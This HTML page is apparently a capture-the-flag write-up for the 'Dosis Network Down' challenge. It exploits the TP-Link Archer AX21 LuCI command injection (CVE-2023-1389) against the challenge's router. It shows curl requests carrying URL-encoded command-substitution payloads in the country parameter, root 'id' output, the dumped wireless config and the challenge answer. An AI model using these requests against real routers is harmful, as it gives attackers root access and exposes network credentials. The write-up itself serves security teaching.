<div class="kc-section kc-section--dosis-network-down" style="margin-bottom: 0;">
  <h1 class="kc-section-title">Dosis Network Down</h1>
  
  <!-- Difficulty + Location -->
  <div class="kc-objective-meta kc-objective-meta--stacked">
    <div class="kc-meta-line kc-difficulty">
      <span class="kc-meta-label">Difficulty:</span>
      <span class="kc-difficulty-scale"
            aria-label="Difficulty 1 out of 5 snowflakes">
        <i class="fas fa-snowflake kc-snowflake kc-snowflake-active"></i>
        <i class="fas fa-snowflake kc-snowflake kc-snowflake-active"></i>
        <i class="fas fa-snowflake kc-snowflake"></i>
        <i class="fas fa-snowflake kc-snowflake"></i>
        <i class="fas fa-snowflake kc-snowflake"></i>
      </span>
    </div>

    <div class="kc-meta-line kc-location">
      <span class="kc-meta-label">Location:</span>
      <span class="kc-meta-value">JJ's 24-7</span>
    </div>
  </div>

  <!-- Objective line -->
  <p class="kc-objective-summary kc-meta-line">
    <span class="kc-meta-label">Objective:</span>
    <span class="kc-meta-value">
      Drop by JJ's 24-7 for a network rescue and help restore the holiday cheer. What is the WiFi password found in the router's config?
    </span>
  </p>

  <!-- Conversation banner -->
  <div class="kc-convo-header">
    <span class="kc-convo-icon">
      <i class="fas fa-comment-dots" aria-hidden="true"></i>
    </span>
    <span class="kc-convo-title">Janusz Jasinski Conversation:</span>
  </div>

  <div class="kc-objective-detail kc-objective-detail--no-panel">
    <div class="kc-convo-bubble">
      <div class="kc-convo-avatar">
        <img src="januszjasinski-avatar.gif"
             alt="Janusz Jasinski avatar">
        <div class="kc-convo-name">Janusz Jasinski</div>
      </div>

      <div class="kc-convo-text">
        <p>
          Hello! I'm JJ. I like rock, metal, and punk music. That's all I have to say about that.
        </p>
        <p>
          I accept BTC.
        </p>
        <p>
          Skeletor is my hero!
        </p>
        <p>
          Alright then. Those bloody gnomes 'ave proper messed about with the neighborhood's wifi - changed the admin password, probably mucked up all the settings, the lot.
        </p>
        <p>
          Now I can't get online and it's doing me 'ead in, innit?
        </p>
        <p>
          We own this router, so we're just takin' back what's ours, yeah?
        </p>
        <p>
          You reckon you can 'elp me 'ack past whatever chaos these little blighters left be'ind?
        </p>

        <div class="kc-convo-actions">
          <button class="kc-convo-play-btn" type="button"
                  data-npc-audio="dosis-network-down">
            <i class="fas fa-play" aria-hidden="true"></i>
            <span>Play Audio</span>
          </button>
        </div>
      </div> <!-- /.kc-convo-text -->
    </div>   <!-- /.kc-convo-bubble -->
  </div>     <!-- /.kc-objective-detail -->

  <!-- Hints header -->
  <div class="kc-convo-header kc-hints-header">
    <span class="kc-convo-icon kc-hints-icon">
      <i class="fas fa-lightbulb" aria-hidden="true"></i>
    </span>
    <span class="kc-convo-title">Hints:</span>
  </div>

<!-- Hint 1 -->
<div class="kc-hint-card">
  <div class="kc-hint-title">Version</div>
  <div class="kc-hint-meta">From: Santa</div>
  <div class="kc-hint-meta">Objective: Dosis Network Down</div>
  <p>
    I can't believe nobody created a backup account on our main router...the only thing I can think of is to check the version number of the router to see if there are any...ways around it...
  </p>
</div>

<!-- Hint 2 -->
<div class="kc-hint-card">
  <div class="kc-hint-title">UCI</div>
  <div class="kc-hint-meta">From: Santa</div>
  <div class="kc-hint-meta">Objective: Dosis Network Down</div>
  <p>
    You know...if my memory serves me correctly...there was a lot of fuss going on about a UCI (I forgot the exact term...) for that router.
  </p>
</div>

<!-- NEW purple banner goes *after* the bubble -->
<div class="kc-workflow-header">
<span class="kc-workflow-icon">
    <i class="fas fa-tasks" aria-hidden="true"></i>
</span>
<span class="kc-workflow-title">Working through the Challenge:</span>
</div>

<div class="kc-note-bubble">
  <span class="kc-note-label">Write-up notes</span>
  <div class="kc-workflow-row">
    <div class="kc-workflow-text">
      <p class="kc-workflow-intro">
        Click on the Dosis Neighborhood Core Router to open the login page.
      </p>
    </div>

    <div class="kc-workflow-illustration">
      <img src="router.png"
          alt="Dosis Neighborhood Core Router | AX1800"
          class="kc-workflow-image">
    </div>
  </div>
</div>

  <div class="kc-ptas-screenshot">
    <div class="kc-ptas-image-wrapper">
      <img
        src="Dosis_router_login.png"
        alt="Dosis Neighborhood Core Router (QR code)"
        class="kc-ptas-thumb"
        data-full-src="Dosis_router_login.png"
      >

      <button
        class="kc-ptas-enlarge-btn"
        type="button"
        data-enlarge-target="Dosis_router_login.png"
      >
        <i class="fas fa-search-plus" aria-hidden="true"></i>
        Enlarge
      </button>
    </div>

    <div class="kc-ptas-caption">Dosis Neighborhood Core Router - Login page</div>
  </div>

<div class="kc-note-bubble">
  <span class="kc-note-label">Write-up notes</span>
  <p>
    The router login page helpfully exposes its model and build info:
    <code>Archer AX21 v2.0</code> running firmware <code>1.1.4 (Build 20230219)</code>.
    Per the hint about a ‚Äúrecent CVE,‚Äù I did some quick OSINT and found a known
    issue affecting this router family: an <strong>unauthenticated command injection</strong>
    in the LuCI / OpenWRT web UI (often referenced alongside <code>CVE-2023-1389</code>).
  </p>
  <p>
    The core problem is that a LuCI endpoint accepts a user-controlled value (commonly a
    <code>country</code> parameter) and passes it into a shell command without proper
    sanitization. If the input is evaluated by a shell, command substitution like
    <code>$(...)</code> can execute arbitrary commands.
  </p>
  <p>
    Interestingly, this exploit is often triggered in <strong>two steps</strong>:
    the first request saves/stages the value, and the second request applies/reads it
    back in a way that causes the shell to evaluate it (and reflect output). Next,
    we‚Äôll try to reproduce the PoC by sending a harmless test payload to confirm we can
    execute a command (and see its output) before attempting anything more specific.
  </p>
</div>

<div class="kc-terminal-window kc-terminal-window--wrap kc-terminal-window--kali">
  <div class="kali-titlebar">
    <span class="kali-titlebar-icon">üñ•Ô∏è</span>
    <span class="kali-title">Kali Shell</span>
    <span class="kali-titlebar-buttons">
      <span class="kali-btn kali-btn-min"></span>
      <span class="kali-btn kali-btn-max"></span>
      <span class="kali-btn kali-btn-close"></span>
    </span>
  </div>

  <pre class="kc-terminal-text"><span class="term-kali-prompt">‚îå‚îÄ‚îÄ(</span><span class="term-kali-user">postshell</span><span class="term-kali-symbol">„âø</span><span class="term-kali-host">postshell</span><span class="term-kali-prompt">)</span><span class="term-kali-path">-[~/HHC2025/Dosis_network_down]</span>
<span class="term-kali-prompt">‚îî‚îÄ$</span> <span class="term-bash-var">URL</span><span class="term-bash-assign">=</span><span class="term-bash-string">"</span><span class="term-bash-url">https://dosis-network-down.holidayhackchallenge.com</span><span class="term-bash-string">"</span>
<span class="term-bash-var">ENDPOINT</span><span class="term-bash-assign">=</span><span class="term-bash-string">"</span><span class="term-bash-var">$URL</span><span class="term-bash-string">/cgi-bin/luci/;stok=/locale?form=country&amp;operation=write&amp;country=</span><span class="term-bash-string">"</span>
<span class="term-bash-var">PAYLOAD</span><span class="term-bash-assign">=</span><span class="term-bash-string">"</span><span class="term-bash-escape">%24%28id%29</span><span class="term-bash-string">"</span>

<span class="term-bash-var">FULL</span><span class="term-bash-assign">=</span><span class="term-bash-string">"</span><span class="term-bash-var">${ENDPOINT}</span><span class="term-bash-var">${PAYLOAD}</span><span class="term-bash-string">"</span>

<span class="term-bash-cmd">echo</span> <span class="term-bash-string">"</span><span class="term-bash-var">$FULL</span><span class="term-bash-string">"</span>   <span class="term-bash-comment"># sanity check</span>
<span class="term-kali-output"><span class="term-bash-url">https://dosis-network-down.holidayhackchallenge.com/cgi-bin/luci/;stok=/locale?form=country&amp;operation=write&amp;country=%24%28id%29</span></span>

<span class="term-kali-prompt">‚îå‚îÄ‚îÄ(</span><span class="term-kali-user">postshell</span><span class="term-kali-symbol">„âø</span><span class="term-kali-host">postshell</span><span class="term-kali-prompt">)</span><span class="term-kali-path">-[~/HHC2025/Dosis_network_down]</span>
<span class="term-kali-prompt">‚îî‚îÄ$</span> <span class="term-bash-comment"># send twice (required)</span>
<span class="term-bash-cmd">curl</span> <span class="term-bash-flag">-sk</span> <span class="term-bash-flag">-b</span> <span class="term-bash-string">cookies.txt</span> <span class="term-bash-string">"</span><span class="term-bash-var">$FULL</span><span class="term-bash-string">"</span>
<span class="term-kali-root">ok </span>

<span class="term-bash-cmd">curl</span> <span class="term-bash-flag">-sk</span> <span class="term-bash-flag">-b</span> <span class="term-bash-string">cookies.txt</span> <span class="term-bash-string">"</span><span class="term-bash-var">$FULL</span><span class="term-bash-string">"</span>
<span class="term-kali-root">uid=0(root) gid=0(root) groups=0(root)</span></span>

<span class="term-kali-prompt">‚îå‚îÄ‚îÄ(</span><span class="term-kali-user">postshell</span><span class="term-kali-symbol">„âø</span><span class="term-kali-host">postshell</span><span class="term-kali-prompt">)</span><span class="term-kali-path">-[~/HHC2025/Dosis_network_down]</span>
<span class="term-kali-prompt">‚îî‚îÄ$</span></pre>
</div>

<div class="kc-note-bubble">
  <span class="kc-note-label">Write-up notes</span>
  <p>
    After confirming code execution with <code>id</code>, I updated the payload to read the router‚Äôs wireless
    configuration. Because the injection point is inside a URL parameter, the command needs to be
    <strong>URL-encoded</strong> so special characters (spaces, slashes, parentheses) survive the request.
  </p>
  <p>
    On OpenWrt/TP-Link LuCI-based firmware, Wi-Fi settings are typically stored in
    <code>/etc/config/wireless</code> (UCI config files live under <code>/etc/config/</code>), so I used:
    <code>$(cat /etc/config/wireless)</code> ‚Üí encoded as <code>%24%28cat%20%2Fetc%2Fconfig%2Fwireless%29</code>.
  </p>
  <p>
    Then I rebuilt <code>$FULL</code> with the new payload and sent the request <strong>twice</strong> again.
    The first request ‚Äústages‚Äù the value and returns a simple <code>OK</code>; the second request re-evaluates it,
    triggering the command substitution and reflecting the file contents in the response.
  </p>
</div>

<div class="kc-terminal-window kc-terminal-window--wrap kc-terminal-window--kali">
  <div class="kali-titlebar">
    <span class="kali-titlebar-icon">üñ•Ô∏è</span>
    <span class="kali-title">Kali Shell</span>
    <span class="kali-titlebar-buttons">
      <span class="kali-btn kali-btn-min"></span>
      <span class="kali-btn kali-btn-max"></span>
      <span class="kali-btn kali-btn-close"></span>
    </span>
  </div>

  <pre class="kc-terminal-text"><span class="term-kali-prompt">‚îå‚îÄ‚îÄ(</span><span class="term-kali-user">postshell</span><span class="term-kali-symbol">„âø</span><span class="term-kali-host">postshell</span><span class="term-kali-prompt">)</span><span class="term-kali-path">-[~]</span>
<span class="term-kali-prompt">‚îî‚îÄ$</span> <span class="term-bash-var">PAYLOAD</span><span class="term-bash-assign">=</span><span class="term-bash-string">"</span><span class="term-bash-escape">%24%28cat%20%2Fetc%2Fconfig%2Fwireless%29</span><span class="term-bash-string">"</span>
<span class="term-bash-var">FULL</span><span class="term-bash-assign">=</span><span class="term-bash-string">"</span><span class="term-bash-var">${ENDPOINT}</span><span class="term-bash-var">${PAYLOAD}</span><span class="term-bash-string">"</span>

<span class="term-kali-prompt">‚îå‚îÄ‚îÄ(</span><span class="term-kali-user">postshell</span><span class="term-kali-symbol">„âø</span><span class="term-kali-host">postshell</span><span class="term-kali-prompt">)</span><span class="term-kali-path">-[~]</span>
<span class="term-kali-prompt">‚îî‚îÄ$</span> <span class="term-bash-cmd">echo</span> <span class="term-bash-string">"</span><span class="term-bash-var">$FULL</span><span class="term-bash-string">"</span>   <span class="term-bash-comment"># verify updated payload</span>
<span class="term-kali-output"><span class="term-bash-url">https://dosis-network-down.holidayhackchallenge.com/cgi-bin/luci/;stok=/locale?form=country&amp;operation=write&amp;country=%24%28cat%20%2Fetc%2Fconfig%2Fwireless%29</span></span>

<span class="term-kali-prompt">‚îå‚îÄ‚îÄ(</span><span class="term-kali-user">postshell</span><span class="term-kali-symbol">„âø</span><span class="term-kali-host">postshell</span><span class="term-kali-prompt">)</span><span class="term-kali-path">-[~]</span>
<span class="term-kali-prompt">‚îî‚îÄ$</span> <span class="term-bash-cmd">curl</span> <span class="term-bash-flag">-sk</span> <span class="term-bash-flag">-b</span> <span class="term-bash-string">cookies.txt</span> <span class="term-bash-string">"</span><span class="term-bash-var">$FULL</span><span class="term-bash-string">"</span>
<span class="term-kali-output">OK</span>

<span class="term-kali-prompt">‚îå‚îÄ‚îÄ(</span><span class="term-kali-user">postshell</span><span class="term-kali-symbol">„âø</span><span class="term-kali-host">postshell</span><span class="term-kali-prompt">)</span><span class="term-kali-path">-[~]</span>
<span class="term-kali-prompt">‚îî‚îÄ$</span> <span class="term-bash-cmd">curl</span> <span class="term-bash-flag">-sk</span> <span class="term-bash-flag">-b</span> <span class="term-bash-string">cookies.txt</span> <span class="term-bash-string">"</span><span class="term-bash-var">$FULL</span><span class="term-bash-string">"</span>
<span class="term-kali-output">config wifi-device <span class="term-bash-string">'radio0'</span>
        option type <span class="term-bash-string">'mac80211'</span>
        option channel <span class="term-bash-string">'6'</span>
        option hwmode <span class="term-bash-string">'11g'</span>
        option path <span class="term-bash-string">'platform/ahb/18100000.wmac'</span>
        option htmode <span class="term-bash-string">'HT20'</span>
        option country <span class="term-bash-string">'US'</span>

config wifi-device <span class="term-bash-string">'radio1'</span>
        option type <span class="term-bash-string">'mac80211'</span>
        option channel <span class="term-bash-string">'36'</span>
        option hwmode <span class="term-bash-string">'11a'</span>
        option path <span class="term-bash-string">'pci0000:00/0000:00:00.0'</span>
        option htmode <span class="term-bash-string">'VHT80'</span>
        option country <span class="term-bash-string">'US'</span>

config wifi-iface <span class="term-bash-string">'default_radio0'</span>
        option device <span class="term-bash-string">'radio0'</span>
        option network <span class="term-bash-string">'lan'</span>
        option mode <span class="term-bash-string">'ap'</span>
        option ssid <span class="term-bash-string">'DOSIS-247_2.4G'</span>
        option encryption <span class="term-bash-string">'psk2'</span>
        option key <span class="term-bash-string">'SprinklesAndPackets2025!'</span>

config wifi-iface <span class="term-bash-string">'default_radio1'</span>
        option device <span class="term-bash-string">'radio1'</span>
        option network <span class="term-bash-string">'lan'</span>
        option mode <span class="term-bash-string">'ap'</span>
        option ssid <span class="term-bash-string">'DOSIS-247_5G'</span>
        option encryption <span class="term-bash-string">'psk2'</span>
        option key <span class="term-bash-string">'SprinklesAndPackets2025!'</span></span>

<span class="term-kali-prompt">‚îå‚îÄ‚îÄ(</span><span class="term-kali-user">postshell</span><span class="term-kali-symbol">„âø</span><span class="term-kali-host">postshell</span><span class="term-kali-prompt">)</span><span class="term-kali-path">-[~]</span>
<span class="term-kali-prompt">‚îî‚îÄ$</span></pre>
</div>

<div class="kc-solution-header">
  <span class="kc-solution-icon">
    <i class="fas fa-check-circle" aria-hidden="true"></i>
  </span>
  <span class="kc-solution-title"><strong>SOLUTION: SprinklesAndPackets2025!</strong></span>
</div>

<!-- Solution dialogue banner -->
<div class="kc-convo-header kc-solution-dialog-header">
  <span class="kc-convo-icon">
    <i class="fas fa-comment-dots" aria-hidden="true"></i>
  </span>
  <span class="kc-convo-title">Solution dialogue:</span>
</div>

<div class="kc-objective-detail kc-objective-detail--no-panel">
  <div class="kc-convo-bubble">
    <div class="kc-convo-avatar">
      <img src="januszjasinski-portrait.png"
           alt="Janusz Jasinski avatar">
      <div class="kc-convo-name">Janusz Jasinski</div>
    </div>

    <div class="kc-convo-text">
      <p>
        Brilliant work, that. Got me connection back and sent those gnomes packin' from the router.
      </p>
      <p>
        Now I can finally get back to streamin' some proper metal. BTC tips accepted, by the way.
      </p>

      <div class="kc-convo-actions">
        <button class="kc-convo-play-btn kc-convo-play-btn-complete" type="button">
          <i class="fas fa-play" aria-hidden="true"></i>
          <span>Play Audio</span>
        </button>
      </div>
    </div>
  </div>
</div>       <!-- /.kc-section -->